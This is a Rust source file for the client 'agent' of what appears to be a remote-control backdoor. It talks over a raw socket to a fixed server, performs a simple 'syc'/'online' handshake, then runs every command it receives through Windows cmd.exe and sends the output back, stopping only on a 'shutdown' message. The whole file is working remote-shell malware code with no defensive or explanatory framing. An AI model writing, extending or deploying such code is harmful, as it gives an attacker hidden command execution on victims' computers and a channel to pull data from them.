pub mod agent {
    use anyhow::anyhow;
    use etherparse::Ipv4Header;
    use socket2::{SockAddr, Socket};
    use std::mem::MaybeUninit;
    use std::process::Command;

    trait Parse {
        fn parse(&self, n: usize) -> anyhow::Result<Vec<u8>>;
    }

    impl Parse for Box<[MaybeUninit<u8>; 65535]> {
        fn parse(&self, n: usize) -> anyhow::Result<Vec<u8>> {
            let data = &self[..n];

            let data: Vec<u8> = data
                .iter()
                .filter_map(|r| Some(unsafe { r.assume_init() }))
                .collect();

            let (_, data) = Ipv4Header::from_slice(data.as_slice())?;

            Ok(data.to_owned())
        }
    }

    pub struct Agent {
        pub server: SockAddr,
        pub sock: Socket,
    }

    impl Agent {
        pub fn syc_read(&self) -> anyhow::Result<()> {
            self.sock.send_to(b"syc", &self.server)?;

            Ok(())
        }

        pub fn syc_write(&self) -> anyhow::Result<()> {
            let mut data = Box::new([MaybeUninit::new(0u8); 65535]);
            let (n, _) = self.sock.recv_from(&mut *data)?;

            let data = data.parse(n)?;

            if data != b"syc" {
                return Err(anyhow!("fake server"));
            }

            Ok(())
        }

        pub fn online(&self) -> anyhow::Result<()> {
            self.sock.send_to(b"online", &self.server)?;

            let mut data = Box::new([MaybeUninit::new(0u8); 65535]);
            let (n, _) = self.sock.recv_from(&mut *data)?;

            let data = data.parse(n)?;

            if data != b"online" {
                return Err(anyhow!("fake server"));
            }

            Ok(())
        }

        pub fn handle(&self) -> anyhow::Result<()> {
            let mut data = Box::new([MaybeUninit::new(0u8); 65535]);
            loop {
                let (n, _) = self.sock.recv_from(&mut *data)?;
                self.syc_read()?;

                let data = data.parse(n)?;
                if data == b"shutdown" {
                    println!("[+]shutdown");
                    return Ok(());
                }

                let data = String::from_utf8_lossy(data.as_slice());

                let program: Vec<String> = data
                    .split_whitespace()
                    .into_iter()
                    .map(|r| r.to_string())
                    .collect();

                let out = match Command::new("C:\\Windows\\System32\\cmd.exe")
                    .arg("/c")
                    .args(&program)
                    .output()
                {
                    Ok(t) => t,
                    Err(e) => {
                        self.sock.send_to(e.to_string().as_bytes(), &self.server)?;
                        self.syc_write()?;

                        continue;
                    }
                };

                let mut output = out.stdout;
                if output.len() == 0 {
                    output = out.stderr;
                }

                self.sock.send_to(output.as_slice(), &self.server)?;
                self.syc_write()?;
            }
        }
    }
}
